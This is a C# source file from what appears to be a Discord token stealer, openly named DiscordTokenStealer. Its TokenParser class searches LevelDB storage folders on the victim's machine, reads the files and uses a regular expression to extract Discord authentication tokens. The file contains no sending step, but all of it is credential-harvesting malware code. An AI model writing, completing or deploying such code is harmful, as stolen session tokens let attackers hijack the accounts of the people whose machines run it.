using System.Reflection;
using System.Text.RegularExpressions;

namespace DiscordTokenStealer.Discord;
public static class TokenParser
{
    private static readonly Regex TokenRegex = new Regex("((?:mfa|nfa))[.](.*?)\"", RegexOptions.Compiled);
    private static IEnumerable<string> ParseFrom(string directory, string searchPattern)
    {
        return Directory.GetFiles(directory, searchPattern).SelectMany(fileName => ParseTokens(File.ReadAllText(fileName)));
    }

    private static IEnumerable<string> ParseTokens(string text)
    {
        return TokenRegex.Matches(text).Where(m => m.Success).Select(match => string.Join('.', match.Groups.Values.Skip(1)));
    }

    public static IEnumerable<string> ParseAll()
    {
        List<string> tokens = new();
        foreach (LevelDbSearchProvider? provider in typeof(LevelDbSearchProvider).GetFields(BindingFlags.Static | BindingFlags.Public).Where(f => f.FieldType == typeof(LevelDbSearchProvider)).Select(f => (LevelDbSearchProvider?) f.GetValue(null)))
        {
            if (provider is not { Exists: true })
            {
                continue;
            }
            tokens.AddRange(ParseFrom(provider.Location, provider.SearchPattern));
        }
        return tokens.Distinct();
    }
}